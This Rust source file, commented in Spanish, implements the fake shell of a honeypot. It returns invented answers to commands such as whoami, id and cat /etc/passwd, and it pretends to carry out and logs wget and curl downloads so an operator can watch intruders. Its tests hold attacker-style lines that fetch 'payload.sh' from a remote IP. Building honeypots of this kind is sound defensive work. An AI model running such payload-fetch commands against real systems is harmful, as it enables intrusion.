//! El shell falso que se sirve después de un login exitoso.
//!
//! Todas las respuestas son inventadas: la trampa nunca toca un sistema real. Las
//! respuestas existen para **mantener al atacante hablando** mientras el operador
//! observa y registra lo que hace.

/// Datos de una descarga simulada: qué pidió, con qué herramienta y cuánto «pesó».
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Descarga {
    pub url: String,
    pub archivo: String,
    pub bytes: usize,
    /// La herramienta que se usó: "wget" o "curl".
    pub herramienta: &'static str,
}

/// Lo que el shell falso responde a una orden.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellResponse {
    pub output: String,
    /// El atacante pidió salir.
    pub exit: bool,
    /// Si la orden fue una descarga, aquí van los datos.
    pub download: Option<Descarga>,
}

const PASSWD: &str = "root:x:0:0:root:/root:/bin/bash\n\
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n\
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash";

/// Peso simulado de la descarga (un número redondo y creíble).
const TAMANO_DESCARGA: usize = 1024;

/// Responde a una orden como lo haría la máquina fingida.
pub fn respond(comando: &str) -> ShellResponse {
    let limpio = comando.trim();
    let minusculas = limpio.to_lowercase();

    if minusculas == "exit" || minusculas == "logout" {
        return ShellResponse {
            output: "logout".to_string(),
            exit: true,
            download: None,
        };
    }

    if minusculas == "uname -a" {
        return simple(
            "Linux victima 6.5.0-14-generic #14-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux",
        );
    }
    if minusculas == "uname" {
        return simple("Linux");
    }
    if minusculas == "whoami" {
        return simple("root");
    }
    if minusculas == "id" {
        return simple("uid=0(root) gid=0(root) groups=0(root)");
    }
    if minusculas == "hostname" {
        return simple("victima");
    }
    if minusculas == "pwd" {
        return simple("/root");
    }
    if minusculas == "ls" || minusculas == "ls -la" {
        return simple("snap  snapd  srv  sys  tmp  usr  var");
    }
    if minusculas == "cat /etc/passwd" {
        return simple(PASSWD);
    }

    if minusculas.starts_with("wget ") || minusculas.starts_with("curl ") {
        return descarga(limpio, &minusculas);
    }

    simple(&format!("bash: {limpio}: command not found"))
}

/// Simula la descarga de un archivo, como la haría wget o curl.
fn descarga(comando: &str, minusculas: &str) -> ShellResponse {
    let url = comando
        .split_whitespace()
        .nth(1)
        .unwrap_or("destino")
        .to_string();
    let herramienta = if minusculas.starts_with("wget ") {
        "wget"
    } else {
        "curl"
    };
    let archivo = url
        .rsplit('/')
        .next()
        .filter(|parte| !parte.is_empty())
        .unwrap_or("archivo")
        .to_string();
    let servidor = url
        .split("//")
        .nth(1)
        .and_then(|rest| rest.split('/').next())
        .unwrap_or("servidor")
        .to_string();

    let salida = if herramienta == "wget" {
        format!(
            "Connecting to {servidor}:80...\n\
             HTTP request sent, awaiting response... 200 OK\n\
             Length: {TAMANO_DESCARGA} [application/x-shell]\n\
             Saving to: '{archivo}'\n\n\
             {servidor}:80 '{archivo}' saved [{TAMANO_DESCARGA}/{TAMANO_DESCARGA}]"
        )
    } else {
        format!(
            "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n\
             100 {TAMANO_DESCARGA}  100 {TAMANO_DESCARGA}    0     0   1024      0 --:--:-- --:--:-- --:--:--  1024\n\
             Downloading '{archivo}' ... 100% [====] {TAMANO_DESCARGA}/{TAMANO_DESCARGA} OK"
        )
    };

    ShellResponse {
        output: salida,
        exit: false,
        download: Some(Descarga {
            url,
            archivo,
            bytes: TAMANO_DESCARGA,
            herramienta,
        }),
    }
}

fn simple(salida: &str) -> ShellResponse {
    ShellResponse {
        output: salida.to_string(),
        exit: false,
        download: None,
    }
}

#[cfg(test)]
mod pruebas {
    use super::*;

    #[test]
    fn responde_uname_con_un_kernel_falso() {
        let respuesta = respond("uname -a");
        assert!(respuesta.output.contains("Linux victima"));
        assert!(!respuesta.exit);
        assert!(respuesta.download.is_none());
    }

    #[test]
    fn responde_whoami_e_id() {
        assert_eq!(respond("whoami").output, "root");
        assert!(respond("id").output.contains("uid=0(root)"));
    }

    #[test]
    fn responde_cat_passwd_con_usuarios_falsos() {
        let respuesta = respond("cat /etc/passwd");
        assert!(respuesta.output.contains("root:x:0:0"));
        assert!(respuesta.output.contains("ubuntu"));
    }

    #[test]
    fn wget_simula_la_descarga_y_anota_los_datos() {
        let respuesta = respond("wget http://198.51.100.7/payload.sh");
        let descarga = respuesta.download.expect("debe registrar la descarga");
        assert_eq!(descarga.herramienta, "wget");
        assert_eq!(descarga.archivo, "payload.sh");
        assert_eq!(descarga.bytes, 1024);
        assert!(respuesta.output.contains("200 OK"));
        assert!(respuesta.output.contains("Saving to: 'payload.sh'"));
    }

    #[test]
    fn curl_simula_la_descarga_con_su_propio_formato() {
        let respuesta = respond("curl http://198.51.100.7/payload.sh");
        let descarga = respuesta.download.expect("debe registrar la descarga");
        assert_eq!(descarga.herramienta, "curl");
        assert!(respuesta.output.contains("100%"));
    }

    #[test]
    fn exit_termina_la_sesion() {
        assert!(respond("exit").exit);
        assert!(respond("logout").exit);
    }

    #[test]
    fn una_orden_desconocida_parece_como_un_shell_real() {
        let respuesta = respond("frobnicate --all");
        assert_eq!(
            respuesta.output,
            "bash: frobnicate --all: command not found"
        );
        assert!(respuesta.download.is_none());
    }
}
